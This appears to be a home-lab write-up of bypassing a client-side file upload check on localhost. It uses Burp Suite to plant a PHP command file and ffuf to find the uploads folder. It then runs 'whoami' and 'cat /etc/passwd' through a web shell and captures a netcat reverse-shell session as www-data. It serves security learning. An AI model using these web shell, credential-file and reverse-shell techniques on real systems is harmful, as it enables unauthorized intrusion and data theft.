# Insecure File Upload - Basic Bypass

- When I arrived at the website, I discovered a section dedicated to uploading files.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/1648bea8-6859-47c1-a990-e0d8533e6e22)

- During my testing, I attempted to upload a text file, but I encountered a restriction stating that only PNG and JPG files are permitted for uploading.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/914c4299-4da3-4e5c-a68a-ab1bb13ff602)

- Once again, I attempted to upload the file to observe if any requests were sent to the server. However, after I looked it over, I did not see any requests being made during the upload process.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/82a8f37e-2833-4fab-b39a-79f928fd5588)

- I repeated the process of uploading a PNG file and intercepted the corresponding request using Burp Suite for analysis.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/e420cf1e-5dfb-4d57-9ed9-07d1271a716f)

- After sending the request to the repeater in Burp Suite, I proceeded to make some minor modifications to the request in an attempt to achieve my goal. I changed the file name extension from "png" to "txt" and removed the image data. Instead, I inserted the text "Hello" in its place.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/44bf9630-045d-4f0d-b344-16b6d36e5b52)

- Following the successful modification of the request, I refreshed the browser page to verify if the file was indeed uploaded.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/a38ca213-ebd1-42eb-afbf-c228d7732a2a)

- This time I used a PHP cmd to extract the data from the server. For this, I have changed the filename and inserted the PHP command.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/bde039b8-5706-4e50-9e0d-36e2e0d86eeb)


- In my attempt to locate the uploaded file folder, I utilized the tool "ffuf." Through this process, I successfully discovered an "upload" folder located under the "labs" directory.

```bash
└─$ ffuf -u http://localhost/labs/FUZZ -w /usr/share/wordlists/dirb/common.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://localhost/labs/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 56ms]
    * FUZZ: .htaccess

[Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 100ms]
    * FUZZ: .htpasswd

[Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 153ms]
    * FUZZ: .hta

[Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 197ms]
    * FUZZ: 

[Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 0ms]
    * FUZZ: uploads

:: Progress: [4614/4614] :: Job [1/1] :: 46 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```
- Upon navigating to the discovered "upload" folder under the "labs" directory, I obtained the following output:

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/1bfdec73-bf4d-4206-b0a6-7cd313bdbc5e)

- To get the desired output, I need to send a command with argument, so I tried with this command in the URL:
- cmd: `http://localhost/labs/uploads/cmd.php?cmd=whoami`

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/f598091a-35ee-470f-99e9-37a4067e635a)

- I am also able to fetch the passwd file by using command: `http://localhost/labs/uploads/cmd.php?cmd=cat /etc/passwd`

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/b5c6aeba-e3d9-4607-ba83-0f9ac58e182f)

- To improve the view I switched to the page source.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/a5933a85-c103-4314-8aa8-5fdedf16bac3)

- I am also able to get a reverse shell to my system by using the [pentest-monkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) PHP reverse shell script.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/0d8ff565-0466-45d5-ae5f-e789aad11976)

- After setting the Netcat listening server and navigating to the file I am indeed successful in getting the reverse shell back to my system.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/7fe8a9c7-b777-4a97-b38e-0d53086e1b66)

```bash
└─$ rlwrap nc -nvlp 1234
listening on [any] 1234 ...
connect to [xxx.xxx.xxx.xxx] from (UNKNOWN) [17x.xxx.xx.x] 34670
Linux d19181ed4936 6.3.0-kali1-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.3.7-1kali1 (2023-06-29) x86_64 GNU/Linux
 05:22:07 up  1:52,  0 users,  load average: 1.35, 1.32, 0.92
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```

### Task Accomplished!
